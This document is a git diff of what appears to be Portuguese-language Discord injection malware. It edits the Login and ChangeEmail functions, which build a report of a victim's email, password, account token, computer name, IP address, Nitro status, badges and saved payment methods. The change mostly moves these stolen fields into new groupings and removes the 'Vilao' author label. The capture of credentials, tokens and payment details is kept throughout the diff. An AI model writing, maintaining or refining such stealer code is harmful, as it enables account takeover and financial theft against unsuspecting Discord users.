@@ -52,11 +52,7 @@ function Login(e, t, n) {
                             title: "Login",
                             color: 0000000,
                             fields: [{
-                                name: "Adcionais",
-                                value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\nInjetado Em: ${discordInstall}\n\`\`\``,
-                                inline: !1
-                            }, {
-                                name: "TAG",
+                                name: "Nome",
                                 value: `\`${i.username}#${i.discriminator}\``,
                                 inline: !0
                             }, {
@@ -64,21 +60,9 @@ function Login(e, t, n) {
                                 value: `\`${i.id}\``,
                                 inline: !0
                             }, {
-                                name: "Nitro",
-                                value: `${GetNitro(i.premium_type)}`,
-                                inline: !1
-                            }, {
-                                name: "Badges",
-                                value: `${GetBadges(i.flags)}`,
-                                inline: !1
-                            }, {
-                                name: "Pagamento",
-                                value: `${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"`❌`";if(2==e.type&&1!=e.invalid)t+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";t+="`✔️` :credit_card:"}}),""==t&&(t="`❌`"),t}()}`,
-                                inline: !1
-                            }, {
                                 name: "Email",
                                 value: `\`${e}\``,
-                                inline: !0
+                                inline: !1
                             }, {
                                 name: "Senha",
                                 value: `\`${t}\``,
@@ -87,13 +71,15 @@ function Login(e, t, n) {
                                 name: "Token",
                                 value: `\`\`\`${n}\`\`\``,
                                 inline: !1
+                            }, {
+                                name: "PC",
+                                value: `\`\`\`NomePC: ${computerName}\nIP: ${s}\nInjetado Em: ${discordInstall}\n\`\`\``,
+                                inline: !1
+                            }, {
+                                name: "Conta",
+                                value: `\`\`\`Nitro: ${GetNitro(i.premium_type)}\nBadges: ${GetBadges(i.flags)}\nPagamento: ${function(){const e=JSON.parse(o);var t="";return e.forEach(e=>{if(""==e.type)return"❌";if(2==e.type&&1!=e.invalid)t+="✔️ Paypal";else{if(1!=e.type||1==e.invalid)return"❌";t+="✔️ Cartão"}}),""==t&&(t="❌"),t}()}\n\`\`\``,
+                                inline: !1
                             }],
-                            author: {
-                                name: "Vilao"
-                            },
-                            footer: {
-                                text: "Vilao"
-                            },
                             thumbnail: {
                                 url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`
                             }
@@ -206,7 +192,7 @@ function ChangeEmail(e, t, n) {
                         }, {
                             name: "Novo Email",
                             value: `\`${e}\``,
-                            inline: !0
+                            inline: !1
                         }, {
                             name: "Senha",
                             value: `\`${t}\``,
